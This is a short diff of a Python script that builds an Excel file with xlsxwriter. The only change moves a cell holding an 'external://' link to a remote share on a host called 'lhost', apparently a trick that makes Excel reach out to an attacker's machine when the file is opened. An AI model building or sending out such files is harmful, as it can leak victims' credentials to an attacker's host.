@@ -11,6 +11,6 @@ import xlsxwriter
 workbook = xlsxwriter.Workbook('crap.xlsx')
 worksheet = workbook.add_worksheet()
 
-worksheet.write_url('W1', "external://"+lhost+"\share\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
+worksheet.write_url('AW1', "external://"+lhost+"\share\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
 
 workbook.close()
